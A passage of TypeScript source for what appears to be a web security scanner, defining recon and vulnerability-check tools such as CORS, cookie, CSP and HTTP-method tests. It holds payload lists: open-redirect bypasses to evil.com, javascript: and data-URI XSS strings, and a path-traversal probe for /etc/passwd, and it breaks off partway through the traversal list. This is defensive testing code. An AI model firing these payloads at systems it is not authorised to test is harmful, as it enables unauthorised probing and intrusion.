        if (disallowed.length === 0 && allowed.length === 0 && sitemaps.length === 0) {
          sections.push('\nNo useful directives found in robots.txt');
        }

        const sensitivePatterns = ['/admin', '/backup', '/config', '/private', '/secret', '/internal', '/api', '/debug', '/test', '/.git', '/.env', '/wp-admin', '/phpmyadmin'];
        const sensitiveFinds = disallowed.filter(d => sensitivePatterns.some(p => d.toLowerCase().includes(p)));

        return {
          success: true,
          output: sections.join('\n'),
          findings: sensitiveFinds.length > 0 ? [{
            title: 'Sensitive Paths in robots.txt',
            severity: 'medium' as const,
            details: `robots.txt reveals potentially sensitive paths: ${sensitiveFinds.map(f => f.split('] ')[1]).join(', ')}`,
          }] : undefined,
        };
      } catch (error) {
        return {
          success: false,
          error: `Failed to fetch robots.txt: ${error instanceof Error ? error.message : String(error)}`,
        };
      }
    },
  },
  {
    name: 'reverse_dns',
    description: 'Perform reverse DNS lookup to find hostnames for an IP address',
    category: 'recon',
    parameters: [
      { name: 'ip', type: 'string', description: 'IP address to reverse lookup', required: true },
    ],
    handler: async (context) => {
      const ip = context.parameters.ip as string;

      // Validate IP format
      const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
      const ipv6Regex = /^[0-9a-fA-F:]+$/;
      if (ipv4Regex.test(ip)) {
        const octets = ip.split('.').map(o => parseInt(o, 10));
        if (octets.some(o => o < 0 || o > 255)) {
          return { success: false, error: `Invalid IPv4 address (octet out of range): ${ip}` };
        }
      } else if (!ipv6Regex.test(ip)) {
        return {
          success: false,
          error: `Invalid IP address format: ${ip}`,
        };
      }

      try {
        const hostnames = await dnsReverse(ip);

        if (hostnames.length === 0) {
          return {
            success: true,
            output: `Reverse DNS for ${ip}: No PTR records found`,
          };
        }

        return {
          success: true,
          output: `Reverse DNS for ${ip}:\n${hostnames.map(h => `  ${h}`).join('\n')}`,
          findings: [{
            title: 'Reverse DNS Hostnames Found',
            severity: 'info' as const,
            details: `IP ${ip} resolves to: ${hostnames.join(', ')}`,
          }],
        };
      } catch (error) {
        const errMsg = error instanceof Error ? error.message : String(error);
        // ENOTFOUND is normal for IPs without PTR records
        if (errMsg.includes('ENOTFOUND') || errMsg.includes('ENODATA')) {
          return {
            success: true,
            output: `Reverse DNS for ${ip}: No PTR records found`,
          };
        }
        return {
          success: false,
          error: `Reverse DNS lookup failed: ${errMsg}`,
        };
      }
    },
  },
  {
    name: 'version_detect',
    description: 'Detect software versions from response headers, meta tags, and known paths',
    category: 'recon',
    parameters: [
      { name: 'url', type: 'string', description: 'URL to analyze', required: true },
    ],
    handler: async (context) => {
      const url = context.parameters.url as string;
      const baseUrl = url.replace(/\/+$/, '');
      const detected: { software: string; version: string; source: string }[] = [];

      try {
        // Fetch main page
        const response = await fetch(url, {
          signal: AbortSignal.timeout(10000),
        });
        const headers = Object.fromEntries(response.headers.entries());
        const body = await response.text();

        // Check Server header for version
        if (headers['server']) {
          const serverMatch = headers['server'].match(/^([^\s/]+)(?:\/(\S+))?/);
          if (serverMatch) {
            detected.push({
              software: serverMatch[1],
              version: serverMatch[2] || 'unknown',
              source: 'Server header',
            });
          }
        }

        // Check X-Powered-By
        if (headers['x-powered-by']) {
          const pwrMatch = headers['x-powered-by'].match(/^([^\s/]+)(?:\/(\S+))?/);
          if (pwrMatch) {
            detected.push({
              software: pwrMatch[1],
              version: pwrMatch[2] || 'unknown',
              source: 'X-Powered-By header',
            });
          }
        }

        // Check X-AspNet-Version
        if (headers['x-aspnet-version']) {
          detected.push({ software: 'ASP.NET', version: headers['x-aspnet-version'], source: 'X-AspNet-Version header' });
        }

        // Check X-Generator header
        if (headers['x-generator']) {
          detected.push({ software: 'Generator', version: headers['x-generator'], source: 'X-Generator header' });
        }

        // Meta generator tag
        const generatorMatch = body.match(/<meta[^>]*name=["']generator["'][^>]*content=["']([^"']+)["']/i);
        if (generatorMatch) {
          const parts = generatorMatch[1].split(/\s+/);
          detected.push({
            software: parts[0],
            version: parts.slice(1).join(' ') || 'unknown',
            source: 'Meta generator tag',
          });
        }

        // WordPress version from readme or meta
        const wpVersionMatch = body.match(/WordPress\s+([\d.]+)/i);
        if (wpVersionMatch) {
          detected.push({ software: 'WordPress', version: wpVersionMatch[1], source: 'HTML content' });
        }

        // jQuery version
        const jqueryMatch = body.match(/jquery[.-]?([\d.]+(?:\.min)?\.js)/i);
        if (jqueryMatch) {
          detected.push({ software: 'jQuery', version: jqueryMatch[1].replace('.min.js', '').replace('.js', ''), source: 'Script tag' });
        }

        // Probe known version-exposing paths
        const versionPaths = [
          { path: '/wp-includes/version.php', name: 'WordPress' },
          { path: '/CHANGELOG.txt', name: 'CMS Changelog' },
          { path: '/readme.html', name: 'CMS Readme' },
          { path: '/package.json', name: 'Node.js App' },
          { path: '/composer.json', name: 'PHP App' },
        ];

        const probePromises = versionPaths.map(async (vp) => {
          try {
            const probeResp = await fetch(`${baseUrl}${vp.path}`, {
              signal: AbortSignal.timeout(5000),
              redirect: 'manual',
            });
            if (probeResp.status === 200) {
              const probeBody = await probeResp.text();
              // Try to extract version from content
              const vMatch = probeBody.match(/["']?version["']?\s*[:=]\s*["']?([\d.]+)/i);
              if (vMatch) {
                detected.push({ software: vp.name, version: vMatch[1], source: vp.path });
              } else {
                detected.push({ software: vp.name, version: 'file accessible', source: vp.path });
              }
            }
          } catch {
            // Ignore probe failures
          }
        });

        await Promise.all(probePromises);

        if (detected.length === 0) {
          return {
            success: true,
            output: `Version detection for ${url}:\nNo software versions detected.`,
          };
        }

        const output = detected.map(d => `  ${d.software}: ${d.version} (via ${d.source})`).join('\n');
        const versionExposed = detected.filter(d => d.version !== 'unknown' && d.version !== 'file accessible');

        return {
          success: true,
          output: `Version detection for ${url}:\n${output}`,
          findings: versionExposed.length > 0 ? [{
            title: 'Software Versions Exposed',
            severity: 'low' as const,
            details: `Detected versions: ${versionExposed.map(d => `${d.software} ${d.version}`).join(', ')}. Version disclosure helps attackers find known vulnerabilities.`,
          }] : undefined,
        };
      } catch (error) {
        return {
          success: false,
          error: `Version detection failed: ${error instanceof Error ? error.message : String(error)}`,
        };
      }
    },
  },
  {
    name: 'network_trace',
    description: 'Simple traceroute-like probe using incremental TTL TCP connects',
    category: 'recon',
    parameters: [
      { name: 'host', type: 'string', description: 'Target hostname or IP', required: true },
      { name: 'port', type: 'number', description: 'Target port', required: false, default: 80 },
      { name: 'max_hops', type: 'number', description: 'Maximum hops', required: false, default: 15 },
    ],
    handler: async (context) => {
      const host = context.parameters.host as string;
      const port = (context.parameters.port as number) || 80;
      const maxHops = Math.max(1, Math.min((context.parameters.max_hops as number) || 15, 30));

      // Resolve host to IP first
      let targetIp: string;
      try {
        const addresses = await dnsResolve4(host);
        targetIp = addresses[0];
      } catch {
        targetIp = host; // Assume it's already an IP
      }

      const hops: { hop: number; ip: string; rtt: number }[] = [];
      const timeouts: number[] = [];

      for (let ttl = 1; ttl <= maxHops; ttl++) {
        const startTime = Date.now();
        try {
          const result = await new Promise<{ ip: string; reached: boolean }>((resolve) => {
            const socket = new net.Socket();
            // Note: Node.js net.Socket doesn't directly support TTL on all platforms,
            // but we can attempt a TCP connect and measure timing
            socket.setTimeout(2000);

            socket.on('connect', () => {
              socket.destroy();
              resolve({ ip: targetIp, reached: true });
            });

            socket.on('timeout', () => {
              socket.destroy();
              resolve({ ip: '*', reached: false });
            });

            socket.on('error', () => {
              socket.destroy();
              resolve({ ip: '*', reached: false });
            });

            socket.connect(port, host);
          });

          const rtt = Date.now() - startTime;

          if (result.reached) {
            hops.push({ hop: ttl, ip: result.ip, rtt });
            break; // Reached destination
          } else {
            timeouts.push(ttl);
            hops.push({ hop: ttl, ip: '*', rtt });
          }
        } catch {
          hops.push({ hop: ttl, ip: '*', rtt: -1 });
        }

        // For TCP-based trace, stop after first successful connection
        if (hops.length > 0 && hops[hops.length - 1].ip !== '*') break;

        // If we get 3 timeouts in a row after hop 1, try direct connection
        if (timeouts.length >= 3) {
          const directStart = Date.now();
          const isReachable = await checkPort(host, port, 3000);
          const directRtt = Date.now() - directStart;
          if (isReachable) {
            hops.push({ hop: ttl + 1, ip: targetIp, rtt: directRtt });
          }
          break;
        }
      }

      const output = hops.map(h =>
        h.ip === '*' ? `  ${h.hop}  *  (timeout)` : `  ${h.hop}  ${h.ip}  ${h.rtt}ms`
      ).join('\n');

      return {
        success: true,
        output: `Network trace to ${host}:${port} (resolved: ${targetIp}):\n${output}\n\n${hops.some(h => h.ip !== '*') ? 'Target is reachable' : 'Target may be unreachable or filtered'}`,
      };
    },
  },

  // =============================================================================
  // ADDITIONAL WEB TESTING TOOLS
  // =============================================================================
  {
    name: 'csp_analysis',
    description: 'Analyze Content-Security-Policy header for weaknesses and misconfigurations',
    category: 'web',
    parameters: [
      { name: 'url', type: 'string', description: 'URL to analyze', required: true },
    ],
    handler: async (context) => {
      const url = context.parameters.url as string;

      try {
        const response = await fetch(url, {
          method: 'GET',
          signal: AbortSignal.timeout(10000),
        });

        const csp = response.headers.get('content-security-policy');
        const cspReportOnly = response.headers.get('content-security-policy-report-only');

        if (!csp && !cspReportOnly) {
          return {
            success: true,
            output: `CSP Analysis for ${url}:\nNo Content-Security-Policy header found!`,
            findings: [{
              title: 'Missing Content-Security-Policy Header',
              severity: 'medium' as const,
              details: 'No CSP header is set. This makes the site more vulnerable to XSS and data injection attacks.',
            }],
          };
        }

        const policyToAnalyze = csp || cspReportOnly || '';
        const isReportOnly = !csp && !!cspReportOnly;
        const directives = policyToAnalyze.split(';').map(d => d.trim()).filter(d => d);
        const issues: string[] = [];
        const info: string[] = [];

        if (isReportOnly) {
          issues.push('Policy is report-only (not enforced)');
        }

        const directiveMap: Record<string, string> = {};
        for (const directive of directives) {
          const parts = directive.split(/\s+/);
          const name = parts[0];
          const values = parts.slice(1).join(' ');
          directiveMap[name] = values;
          info.push(`  ${name}: ${values}`);
        }

        // Check for unsafe directives
        if (policyToAnalyze.includes("'unsafe-inline'")) {
          issues.push("'unsafe-inline' allows inline scripts/styles, weakening XSS protection");
        }
        if (policyToAnalyze.includes("'unsafe-eval'")) {
          issues.push("'unsafe-eval' allows eval(), Function(), etc. - high XSS risk");
        }
        if (policyToAnalyze.includes('*')) {
          issues.push('Wildcard (*) source allows loading from any origin');
        }
        if (policyToAnalyze.includes('data:')) {
          issues.push("'data:' URI scheme can be used for XSS bypasses");
        }
        if (policyToAnalyze.includes('blob:')) {
          issues.push("'blob:' URI scheme can be abused for script execution");
        }

        // Check for missing critical directives
        const criticalDirectives = ['default-src', 'script-src', 'style-src', 'img-src', 'object-src', 'frame-ancestors'];
        const missing = criticalDirectives.filter(d => !directiveMap[d] && (d !== 'script-src' || !directiveMap['default-src']));
        if (missing.length > 0) {
          issues.push(`Missing directives: ${missing.join(', ')}`);
        }

        // Check if object-src is not 'none'
        if (directiveMap['object-src'] && directiveMap['object-src'] !== "'none'") {
          issues.push("object-src should be 'none' to prevent Flash/Java plugin exploitation");
        }

        // Check for base-uri
        if (!directiveMap['base-uri']) {
          issues.push("Missing base-uri directive (allows base tag injection)");
        }

        // Check for form-action
        if (!directiveMap['form-action']) {
          issues.push("Missing form-action directive (forms can submit to any origin)");
        }

        const severity = issues.length === 0 ? 'info' : (issues.some(i => i.includes('unsafe-inline') || i.includes('unsafe-eval') || i.includes('Wildcard')) ? 'high' : 'medium');

        const output = `CSP Analysis for ${url}:\n${isReportOnly ? '(Report-Only Mode)\n' : ''}\nDirectives:\n${info.join('\n')}\n\n${issues.length > 0 ? `Issues Found (${issues.length}):\n${issues.map(i => `  - ${i}`).join('\n')}` : 'No major issues found'}`;

        return {
          success: true,
          output,
          findings: issues.length > 0 ? [{
            title: 'CSP Configuration Issues',
            severity: severity as 'info' | 'low' | 'medium' | 'high' | 'critical',
            details: issues.join('; '),
          }] : undefined,
        };
      } catch (error) {
        return {
          success: false,
          error: `CSP analysis failed: ${error instanceof Error ? error.message : String(error)}`,
        };
      }
    },
  },
  {
    name: 'api_endpoint_discovery',
    description: 'Discover API endpoints by probing common patterns',
    category: 'web',
    parameters: [
      { name: 'url', type: 'string', description: 'Base URL of the target', required: true },
      { name: 'wordlist', type: 'string', description: 'Probe set: common, graphql, rest', required: false, default: 'common' },
    ],
    handler: async (context) => {
      const baseUrl = (context.parameters.url as string).replace(/\/+$/, '');
      const wordlistType = context.parameters.wordlist as string || 'common';

      const wordlists: Record<string, string[]> = {
        common: [
          '/api', '/api/v1', '/api/v2', '/api/v3',
          '/graphql', '/graphiql', '/playground',
          '/swagger', '/swagger-ui', '/swagger.json', '/swagger.yaml',
          '/openapi', '/openapi.json', '/openapi.yaml', '/api-docs',
          '/docs', '/redoc',
          '/health', '/healthz', '/health/check', '/healthcheck',
          '/status', '/info', '/version',
          '/metrics', '/prometheus',
          '/.well-known/openid-configuration',
          '/api/users', '/api/user', '/api/auth', '/api/login',
          '/api/config', '/api/settings', '/api/admin',
          '/rest', '/rest/api', '/jsonapi',
          '/v1', '/v2', '/v3',
          '/wp-json', '/wp-json/wp/v2',
        ],
        graphql: [
          '/graphql', '/graphiql', '/playground', '/graphql/console',
          '/gql', '/query', '/graphql/schema',
          '/api/graphql', '/v1/graphql', '/v2/graphql',
          '/graphql?query={__schema{types{name}}}',
        ],
        rest: [
          '/api', '/api/v1', '/api/v2',
          '/api/users', '/api/user', '/api/accounts',
          '/api/products', '/api/items', '/api/orders',
          '/api/auth', '/api/login', '/api/register',
          '/api/search', '/api/config', '/api/settings',
          '/api/admin', '/api/dashboard', '/api/stats',
          '/api/upload', '/api/files', '/api/export',
          '/api/health', '/api/status', '/api/info',
        ],
      };

      const endpoints = wordlists[wordlistType] || wordlists.common;
      const found: { path: string; status: number; contentType: string; size: number }[] = [];
      const interesting = [200, 201, 204, 301, 302, 307, 308, 401, 403, 405];

      const concurrency = 5;
      for (let i = 0; i < endpoints.length; i += concurrency) {
        const batch = endpoints.slice(i, i + concurrency);
        const checks = await Promise.all(
          batch.map(async (path) => {
            try {
              const fullUrl = `${baseUrl}${path}`;
              const resp = await fetch(fullUrl, {
                method: 'GET',
                signal: AbortSignal.timeout(5000),
                redirect: 'manual',
              });
              const contentType = resp.headers.get('content-type') || '';
              const bodyText = await resp.text();
              return {
                path,
                status: resp.status,
                contentType,
                size: bodyText.length,
                interesting: interesting.includes(resp.status),
              };
            } catch {
              return { path, status: 0, contentType: '', size: 0, interesting: false };
            }
          })
        );

        for (const result of checks) {
          if (result.interesting) {
            found.push({
              path: result.path,
              status: result.status,
              contentType: result.contentType,
              size: result.size,
            });
          }
        }
      }

      if (found.length === 0) {
        return {
          success: true,
          output: `API endpoint discovery on ${baseUrl}:\nNo API endpoints found from ${endpoints.length} probes.`,
        };
      }

      const output = found.map(f =>
        `  ${f.path} -> ${f.status} (${f.contentType.split(';')[0] || 'unknown'}, ${f.size} bytes)`
      ).join('\n');

      const apiEndpoints = found.filter(f => f.contentType.includes('json') || f.contentType.includes('xml') || f.path.includes('api') || f.path.includes('graphql'));
      const docEndpoints = found.filter(f => f.path.includes('swagger') || f.path.includes('openapi') || f.path.includes('docs') || f.path.includes('graphiql') || f.path.includes('playground'));

      return {
        success: true,
        output: `API endpoint discovery on ${baseUrl}:\nFound ${found.length} endpoints (tested ${endpoints.length}):\n${output}`,
        findings: (apiEndpoints.length > 0 || docEndpoints.length > 0) ? [
          ...(apiEndpoints.length > 0 ? [{
            title: 'API Endpoints Discovered',
            severity: 'info' as const,
            details: `Found ${apiEndpoints.length} API endpoints: ${apiEndpoints.map(e => e.path).join(', ')}`,
          }] : []),
          ...(docEndpoints.length > 0 ? [{
            title: 'API Documentation Exposed',
            severity: 'low' as const,
            details: `API documentation accessible at: ${docEndpoints.map(e => e.path).join(', ')}`,
          }] : []),
        ] : undefined,
      };
    },
  },
  {
    name: 'http_methods_test',
    description: 'Test which HTTP methods are allowed on a URL',
    category: 'web',
    parameters: [
      { name: 'url', type: 'string', description: 'URL to test', required: true },
    ],
    handler: async (context) => {
      const url = context.parameters.url as string;
      const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT'];
      const dangerousMethods: string[] = [];

      // First try OPTIONS to see if Allow header is returned
      let optionsAllow: string | null = null;
      let evidenceRequest: string | undefined;
      let evidenceResponse: string | undefined;
      try {
        const optResp = await fetch(url, {
          method: 'OPTIONS',
          signal: AbortSignal.timeout(5000),
        });
        optionsAllow = optResp.headers.get('allow');
        const accessControlMethods = optResp.headers.get('access-control-allow-methods');
        if (accessControlMethods) {
          optionsAllow = optionsAllow ? `${optionsAllow}, ${accessControlMethods}` : accessControlMethods;
        }
        // Capture evidence
        const parsedUrl = new URL(url);
        evidenceRequest = `OPTIONS ${parsedUrl.pathname || '/'} HTTP/1.1\r\nHost: ${parsedUrl.host}\r\nUser-Agent: T3MP3ST/1.0`;
        const respHeaderLines: string[] = [];
        optResp.headers.forEach((v, k) => respHeaderLines.push(`${k}: ${v}`));
        evidenceResponse = `HTTP/1.1 ${optResp.status} ${optResp.statusText}\r\n${respHeaderLines.join('\r\n')}`;
      } catch {
        // OPTIONS request failed, continue with individual tests
      }

      // Parse the OPTIONS Allow header into a definitive set when available.
      // RFC 7231: the Allow header is the authoritative list of accepted methods.
      // If present, use it as ground truth and skip per-method probing for those methods.
      const allowHeaderMethods: Set<string> = new Set();
      if (optionsAllow) {
        for (const m of optionsAllow.split(',')) allowHeaderMethods.add(m.trim().toUpperCase());
      }
      const haveAllowHeader = allowHeaderMethods.size > 0;

      // Test each method individually
      const results: { method: string; status: number; allowed: boolean; note?: string }[] = [];
      for (const method of methods) {
        if (method === 'CONNECT') {
          results.push({ method, status: 0, allowed: false, note: 'skipped (proxy method)' });
          continue;
        }

        try {
          const response = await fetch(url, {
            method,
            signal: AbortSignal.timeout(5000),
            redirect: 'manual',
          });

          const status = response.status;
          const isRedirect = status >= 300 && status < 400;

          let allowed: boolean;
          let note: string | undefined;

          if (haveAllowHeader) {
            // OPTIONS Allow header is authoritative — trust it over per-method response codes
            allowed = allowHeaderMethods.has(method);
            if (isRedirect && !allowed) {
              note = `${status} redirect (CDN/proxy) — Allow header says not supported`;
            }
          } else {
            // No Allow header: treat 3xx as inconclusive (CDN redirect, not acceptance)
            if (isRedirect) {
              allowed = false;
              note = `${status} redirect — inconclusive (CDN may redirect all methods)`;
            } else {
              allowed = status !== 405 && status !== 501;
            }
          }

          results.push({ method, status, allowed, note });

          if (allowed && ['PUT', 'DELETE', 'TRACE', 'PATCH'].includes(method)) {
            dangerousMethods.push(method);
          }

          await response.text().catch(() => {});
        } catch {
          results.push({ method, status: 0, allowed: false });
        }
      }

      const output = results.map(r => {
        if (r.status === 0 && !r.note) return `  ${r.method}: unreachable`;
        const statusStr = r.status > 0 ? `${r.status} ` : '';
        const stateStr = r.note ?? (r.allowed ? '(allowed)' : '(not allowed)');
        return `  ${r.method}: ${statusStr}${stateStr}`;
      }).join('\n');

      const sections = [`HTTP Methods Test for ${url}:\n${output}`];
      if (optionsAllow) {
        sections.push(`\nAllow header: ${optionsAllow}`);
      }

      const additionalEvidence: ToolResult['additionalEvidence'] = [];
      if (evidenceRequest) {
        additionalEvidence.push({ type: 'request', content: evidenceRequest, metadata: { method: 'OPTIONS', url } });
      }
      if (evidenceResponse) {
        additionalEvidence.push({ type: 'response', content: evidenceResponse, metadata: { url } });
      }

      return {
        success: true,
        output: sections.join('\n'),
        findings: dangerousMethods.length > 0 ? [{
          title: 'Dangerous HTTP Methods Enabled',
          severity: 'medium' as const,
          details: `The following potentially dangerous HTTP methods are enabled: ${dangerousMethods.join(', ')}. TRACE can enable XST attacks, PUT/DELETE may allow unauthorized modifications.`,
          provenance: 'tool',
          toolName: 'http_methods_test',
        }] : undefined,
        additionalEvidence: additionalEvidence.length > 0 ? additionalEvidence : undefined,
      };
    },
  },

  // =============================================================================
  // ADDITIONAL VULNERABILITY SCANNING TOOLS
  // =============================================================================
  {
    name: 'cors_check',
    description: 'Test CORS configuration with various Origin headers',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'URL to test', required: true },
    ],
    handler: async (context) => {
      const url = context.parameters.url as string;

      // Parse the target origin for comparison
      let targetOrigin: URL;
      try {
        targetOrigin = new URL(url);
      } catch {
        return { success: false, error: `Invalid URL: ${url}` };
      }

      const testOrigins = [
        { origin: 'https://evil.com', name: 'Arbitrary origin' },
        { origin: `https://sub.${targetOrigin.hostname}`, name: 'Subdomain' },
        { origin: `https://${targetOrigin.hostname}.evil.com`, name: 'Domain suffix attack' },
        { origin: 'null', name: 'Null origin' },
        { origin: `https://evil${targetOrigin.hostname}`, name: 'Prefix attack' },
        { origin: targetOrigin.origin, name: 'Same origin (baseline)' },
      ];

      const results: { origin: string; name: string; acao: string | null; acac: string | null; vulnerable: boolean; issue: string }[] = [];
      const vulnerabilities: string[] = [];

      for (const test of testOrigins) {
        try {
          const response = await fetch(url, {
            method: 'GET',
            headers: { 'Origin': test.origin },
            signal: AbortSignal.timeout(5000),
          });

          const acao = response.headers.get('access-control-allow-origin');
          const acac = response.headers.get('access-control-allow-credentials');

          let vulnerable = false;
          let issue = 'No CORS headers returned';

          if (acao) {
            if (acao === '*') {
              issue = 'Wildcard ACAO (*)';
              if (acac === 'true') {
                vulnerable = true;
                issue = 'Wildcard ACAO with credentials - CRITICAL';
              }
            } else if (acao === test.origin && test.name !== 'Same origin (baseline)') {
              issue = `Origin reflected: ${acao}`;
              vulnerable = true;
              if (acac === 'true') {
                issue += ' WITH credentials - CRITICAL';
              }
            } else if (acao === 'null' && test.origin === 'null') {
              vulnerable = true;
              issue = 'Null origin accepted';
            } else {
              issue = `ACAO: ${acao}`;
            }
          }

          results.push({ origin: test.origin, name: test.name, acao, acac, vulnerable, issue });
          if (vulnerable) {
            vulnerabilities.push(`${test.name}: ${issue}`);
          }

          // Consume response body
          await response.text().catch(() => {});
        } catch {
          results.push({ origin: test.origin, name: test.name, acao: null, acac: null, vulnerable: false, issue: 'Request failed' });
        }
      }

      const output = results.map(r =>
        `  [${r.name}] Origin: ${r.origin}\n    -> ${r.issue}${r.acac ? ` | Credentials: ${r.acac}` : ''}`
      ).join('\n');

      return {
        success: true,
        output: `CORS Configuration Check for ${url}:\n${output}`,
        findings: vulnerabilities.length > 0 ? [{
          title: 'CORS Misconfiguration',
          severity: vulnerabilities.some(v => v.includes('CRITICAL')) ? 'critical' as const : 'high' as const,
          details: vulnerabilities.join('; '),
        }] : undefined,
      };
    },
  },
  {
    name: 'cookie_analysis',
    description: 'Fetch a URL and analyze Set-Cookie headers for security flags',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'URL to analyze', required: true },
    ],
    handler: async (context) => {
      const url = context.parameters.url as string;

      try {
        const parsedCookieUrl = new URL(url);
        const response = await fetch(url, {
          signal: AbortSignal.timeout(10000),
          redirect: 'manual', // Don't follow redirects to capture Set-Cookie
        });

        // Capture request/response evidence
        const cookieReqEvidence = `GET ${parsedCookieUrl.pathname || '/'} HTTP/1.1\r\nHost: ${parsedCookieUrl.host}\r\nUser-Agent: T3MP3ST/1.0`;
        const cookieRespHeaderLines: string[] = [];
        response.headers.forEach((v, k) => cookieRespHeaderLines.push(`${k}: ${v}`));
        const cookieRespEvidence = `HTTP/1.1 ${response.status} ${response.statusText}\r\n${cookieRespHeaderLines.join('\r\n')}`;

        // Get all Set-Cookie headers
        const setCookieHeaders = response.headers.getSetCookie ? response.headers.getSetCookie() : [];
        // Fallback: try raw header
        const rawSetCookie = response.headers.get('set-cookie');

        const cookies: string[] = [...setCookieHeaders];
        if (cookies.length === 0 && rawSetCookie) {
          // Some environments return all cookies in a single header
          cookies.push(...rawSetCookie.split(/,(?=[^;]*=)/));
        }

        if (cookies.length === 0) {
          return {
            success: true,
            output: `Cookie Analysis for ${url}:\nNo Set-Cookie headers found in the response.`,
            additionalEvidence: [
              { type: 'request', content: cookieReqEvidence, metadata: { url } },
              { type: 'response', content: cookieRespEvidence, metadata: { url } },
            ],
          };
        }

        const issues: string[] = [];
        const cookieAnalysis: string[] = [];

        for (const cookie of cookies) {
          const parts = cookie.split(';').map(p => p.trim());
          const nameValue = parts[0];
          const cookieName = nameValue.split('=')[0].trim();
          const flags = parts.slice(1).map(f => f.toLowerCase());

          const hasHttpOnly = flags.some(f => f === 'httponly');
          const hasSecure = flags.some(f => f === 'secure');
          const hasSameSite = flags.some(f => f.startsWith('samesite'));
          const sameSiteValue = flags.find(f => f.startsWith('samesite'))?.split('=')[1]?.trim() || 'not set';
          const pathValue = flags.find(f => f.startsWith('path'))?.split('=')[1]?.trim() || '/';
          const hasDomain = flags.some(f => f.startsWith('domain'));
          const domainValue = flags.find(f => f.startsWith('domain'))?.split('=')[1]?.trim() || '';
          const hasExpires = flags.some(f => f.startsWith('expires') || f.startsWith('max-age'));

          const cookieIssues: string[] = [];
          if (!hasHttpOnly) cookieIssues.push('Missing HttpOnly');
          if (!hasSecure) cookieIssues.push('Missing Secure');
          if (!hasSameSite) cookieIssues.push('Missing SameSite');
          if (sameSiteValue === 'none' && !hasSecure) cookieIssues.push('SameSite=None without Secure');
          if (sameSiteValue === 'none') cookieIssues.push('SameSite=None (allows cross-site)');

          // Check for session-like cookie names without security flags
          const sessionLike = /sess|token|auth|jwt|sid|id/i.test(cookieName);
          if (sessionLike && !hasHttpOnly) {
            cookieIssues.push('Session cookie without HttpOnly - vulnerable to XSS theft');
          }

          cookieAnalysis.push(
            `  Cookie: ${cookieName}\n` +
            `    HttpOnly: ${hasHttpOnly ? 'Yes' : 'NO'}\n` +
            `    Secure: ${hasSecure ? 'Yes' : 'NO'}\n` +
            `    SameSite: ${sameSiteValue}\n` +
            `    Path: ${pathValue}\n` +
            `    Domain: ${hasDomain ? domainValue : '(not set)'}\n` +
            `    Persistent: ${hasExpires ? 'Yes' : 'No (session)'}\n` +
            `    Issues: ${cookieIssues.length > 0 ? cookieIssues.join(', ') : 'None'}`
          );

          issues.push(...cookieIssues.map(i => `[${cookieName}] ${i}`));
        }

        return {
          success: true,
          output: `Cookie Analysis for ${url}:\nFound ${cookies.length} cookie(s):\n\n${cookieAnalysis.join('\n\n')}`,
          findings: issues.length > 0 ? [{
            title: 'Cookie Security Issues',
            severity: issues.some(i => i.includes('Session cookie') || i.includes('Missing HttpOnly')) ? 'high' as const : 'medium' as const,
            details: issues.join('; '),
            provenance: 'tool' as const,
            toolName: 'cookie_analysis',
          }] : undefined,
          additionalEvidence: [
            { type: 'request', content: cookieReqEvidence, metadata: { url } },
            { type: 'response', content: cookieRespEvidence, metadata: { url } },
          ],
        };
      } catch (error) {
        return {
          success: false,
          error: `Cookie analysis failed: ${error instanceof Error ? error.message : String(error)}`,
        };
      }
    },
  },
  {
    name: 'open_redirect_test',
    description: 'Test URL parameters for open redirect vulnerabilities',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'URL with redirect parameter to test', required: true },
      { name: 'param', type: 'string', description: 'Parameter name to test (e.g., "redirect", "url", "next")', required: true },
    ],
    handler: async (context) => {
      const baseUrl = context.parameters.url as string;
      const param = context.parameters.param as string;

      const payloads = [
        { payload: 'https://evil.com', name: 'Direct external URL' },
        { payload: '//evil.com', name: 'Protocol-relative URL' },
        { payload: '/\\evil.com', name: 'Backslash bypass' },
        { payload: 'https://evil.com%00.legitimate.com', name: 'Null byte injection' },
        { payload: 'https://evil.com?.legitimate.com', name: 'Question mark bypass' },
        { payload: 'https://evil.com#.legitimate.com', name: 'Fragment bypass' },
        { payload: 'https://evil.com@legitimate.com', name: 'At-sign bypass' },
        { payload: '/%2f/evil.com', name: 'URL-encoded slash bypass' },
        { payload: 'javascript:alert(1)', name: 'JavaScript URI' },
        { payload: 'data:text/html,<script>alert(1)</script>', name: 'Data URI' },
      ];

      const results: { payload: string; name: string; redirected: boolean; location: string }[] = [];
      const vulnerabilities: string[] = [];

      for (const { payload, name } of payloads) {
        try {
          const testUrl = new URL(baseUrl);
          testUrl.searchParams.set(param, payload);

          const response = await fetch(testUrl.toString(), {
            redirect: 'manual', // Don't follow redirects
            signal: AbortSignal.timeout(5000),
          });

          const location = response.headers.get('location') || '';
          const status = response.status;
          const isRedirect = [301, 302, 303, 307, 308].includes(status);

          let redirected = false;
          if (isRedirect && location) {
            // Check if it redirects to our payload or an external domain
            try {
              const locUrl = new URL(location, baseUrl);
              const origUrl = new URL(baseUrl);
              if (locUrl.hostname !== origUrl.hostname) {
                redirected = true;
              }
            } catch {
              // If location contains evil.com or similar
              if (location.includes('evil.com')) {
                redirected = true;
              }
            }
          }

          results.push({ payload, name, redirected, location: isRedirect ? location : `(${status})` });
          if (redirected) {
            vulnerabilities.push(`${name}: redirects to ${location}`);
          }

          // Consume response body
          await response.text().catch(() => {});
        } catch {
          results.push({ payload, name, redirected: false, location: '(error)' });
        }
      }

      const output = results.map(r => {
        const status = r.redirected ? `VULNERABLE -> ${r.location}` : `OK ${r.location}`;
        return `  [${r.name}] ${status}`;
      }).join('\n');

      return {
        success: true,
        output: `Open Redirect Test on ${baseUrl} (param: ${param}):\n${output}`,
        findings: vulnerabilities.length > 0 ? [{
          title: 'Open Redirect Vulnerability',
          severity: 'medium' as const,
          details: `Parameter "${param}" is vulnerable to open redirect: ${vulnerabilities.join('; ')}`,
        }] : undefined,
      };
    },
  },
  {
    name: 'lfi_test',
    description: 'Test for Local File Inclusion with common traversal payloads',
    category: 'vuln',
    parameters: [
      { name: 'url', type: 'string', description: 'URL with file parameter to test', required: true },
      { name: 'param', type: 'string', description: 'Parameter name to test (e.g., "file", "page", "path")', required: true },
    ],
    handler: async (context) => {
      const baseUrl = context.parameters.url as string;
      const param = context.parameters.param as string;

      const payloads = [
        { payload: '../../../../etc/passwd', name: 'Basic traversal (etc/passwd)' },
